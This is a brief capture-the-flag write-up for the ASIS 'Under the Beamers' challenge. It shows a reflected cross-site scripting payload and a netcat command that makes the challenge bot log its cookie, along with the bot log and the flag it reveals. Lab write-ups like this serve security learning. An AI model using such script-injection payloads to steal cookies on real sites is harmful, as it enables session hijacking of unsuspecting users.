# Under the Beamers

```
Clobbered or not clobbered, that's the question :)

See here: http://65.109.209.215:5000, the bot port is 4000!

Please download the attachment

Thanks to kevin-mizu as author! 😊
```

Inspired by <https://sec-consult.com/vulnerability-lab/advisory/reflected-cross-site-scripting-xss-in-codebeamer-alm-solution-by-ptc/>, we can inject arbitrary script into the rendered HTML:

```
<html><script>alert("abc");</script></html>
```

Visit <http://65.109.209.215:5000/> and write the html above in the text area, and you will see the popup.

Then, we ask the bot to print out the cookie for us:

```shell
$ echo '<html><script>console.log(document.cookie);</script></html>' | nc 65.109.209.215 4000
==========
Tips: Every console.log usage on the bot will be sent back to you :)
==========

Starting the browser...
[T1]> New tab created!
[T1]> navigating        | about:blank

Going to the app...

Going to the user provided link...
[T1]> navigating        | http://under-the-beamers-app.internal:5000/?html=%3Chtml%3E%3Cscript%3Econsole.log(document.cookie)%3B%3C%2Fscript%3E%3C%2Fhtml%3E
[T1]> console.log       | flag=ASIS{cfa4807db22fc60758d32ed0950a40e397c8f9c6a11ae89e8235d034f37f3987}
[T1]> console.error     | Failed to load resource: the server responded with a status of 404 (NOT FOUND)
[T1]> console.log       | Initializing Beamer. [Update and engage users effortlessly - https://getbeamer.com]
[T1]> console.error     | Failed to load resource: the server responded with a status of 404 (NOT FOUND)
```

Flag: `ASIS{cfa4807db22fc60758d32ed0950a40e397c8f9c6a11ae89e8235d034f37f3987}`.
